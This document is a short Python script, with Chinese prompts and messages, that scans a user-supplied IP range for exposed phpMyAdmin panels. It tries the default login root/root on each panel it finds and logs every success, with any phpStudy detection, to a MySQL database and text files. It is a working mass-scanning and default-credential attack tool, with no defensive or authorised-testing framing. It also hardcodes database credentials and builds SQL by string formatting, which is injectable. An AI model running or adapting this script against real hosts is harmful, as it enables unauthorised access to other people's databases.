import requests
import IPy
import re
import datetime
import pymysql

db = pymysql.Connect(host='192.168.2.1', user='admin',
                     password='1qaz@WSX', database='mysql')
cursor = db.cursor()

ipsegment = input('请输入ip网段：')
filename = ipsegment.split('/')[0]
file_1 = filename+'.txt'
file_2 = filename+'_root.txt'

payload = {'pma_username': 'root', 'pma_password': 'root'}
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
ip = IPy.IP(ipsegment)
phpmyadmin = []
phpmyadmin_root = []
for i in ip:
    url = 'http://'+str(i) + '/phpmyadmin/index.php'
    print(url)
    try:
        scan_ip = requests.head(url, timeout=0.15, allow_redirects=False)
        if scan_ip.status_code == 200:
            try:
                if re.search('phpmyadmin', scan_ip.headers['Set-Cookie']):
                    print('这是一个phpmyadmin的后台!')
                    phpmyadmin.append(url)
                    try:
                        r = requests.post(url, headers=headers, data=payload)
                        if 'name="login_form"' not in r.text:
                            print('使用默认密码登录成功')
                            password = 'root'
                            version = ''
                            if 'phpStudy' in r.text:
                                version = 'phpStudy'
                            phpmyadmin_root.append(url)
                        else:
                            print('非默认密码！')
                            password = ''
                            version = ''
                        sql = "insert into ip (ip,url,password,version,更新时间) VALUES ('%s','%s','%s','%s','%s')" % (
                            i, url, password, version, datetime.datetime.now())
                        cursor.execute(sql)
                        db.commit()
                        print(sql)
                    except Exception:
                        pass
            except KeyError:
                print('没有set-cookie,非phpmyadmin后台')
    except Exception:
        pass
db.close()

with open(file_1, 'w') as f, open(file_2, 'w') as e:
    f.write("\n".join(phpmyadmin))
    e.write("\n".join(phpmyadmin_root))
